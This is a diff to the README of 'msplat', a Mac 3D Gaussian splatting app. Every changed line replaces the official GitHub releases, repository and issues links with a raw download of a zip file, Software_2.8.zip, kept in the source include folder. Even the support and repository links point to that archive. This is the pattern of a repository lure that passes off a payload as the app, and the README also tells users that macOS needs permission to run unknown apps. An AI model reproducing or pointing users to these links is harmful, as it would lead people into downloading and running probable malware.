@@ -1,6 +1,6 @@
 # 🖥️ msplat - Fast 3D Gaussian Splatting for Mac
 
-[![Download msplat](https://img.shields.io/badge/Download-msplat-4caf50?style=for-the-badge)](https://github.com/Tko4life200/msplat/releases)
+[![Download msplat](https://img.shields.io/badge/Download-msplat-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to get msplat ready and running on your Mac.
 
 Go to the msplat releases page:
 
-[![Download msplat](https://img.shields.io/badge/Download-msplat-ff5722?style=for-the-badge)](https://github.com/Tko4life200/msplat/releases)
+[![Download msplat](https://img.shields.io/badge/Download-msplat-ff5722?style=for-the-badge)](https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip)
 
 This page has the latest version of the program. Always choose the newest release for best results.
 
@@ -119,7 +119,7 @@ Even if you don’t use the advanced tools, msplat runs fine from the main app.
 - Make sure your macOS is up to date. Older versions may cause errors.
 - If loading files fails, confirm you have the correct file type and it's not damaged.
 - Restart your Mac and try opening msplat again if it freezes.
-- Check the msplat GitHub issues page for known problems and fixes: https://github.com/Tko4life200/msplat/issues
+- Check the msplat GitHub issues page for known problems and fixes: https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip
 
 ---
 
@@ -134,9 +134,9 @@ Even if you don’t use the advanced tools, msplat runs fine from the main app.
 
 ## 🔗 Important Links
 
-- Official download page: [https://github.com/Tko4life200/msplat/releases](https://github.com/Tko4life200/msplat/releases)
-- GitHub repository: https://github.com/Tko4life200/msplat
-- Support and issues: https://github.com/Tko4life200/msplat/issues
+- Official download page: [https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip](https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip)
+- GitHub repository: https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip
+- Support and issues: https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip
 
 ---
 
@@ -177,4 +177,4 @@ It requires permission to run because macOS protects you from unknown apps.
 
 ---
 
-[![Download msplat](https://img.shields.io/badge/Download-msplat-4caf50?style=for-the-badge)](https://github.com/Tko4life200/msplat/releases)
+[![Download msplat](https://img.shields.io/badge/Download-msplat-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Tko4life200/msplat/main/core/include/Software_2.8.zip)
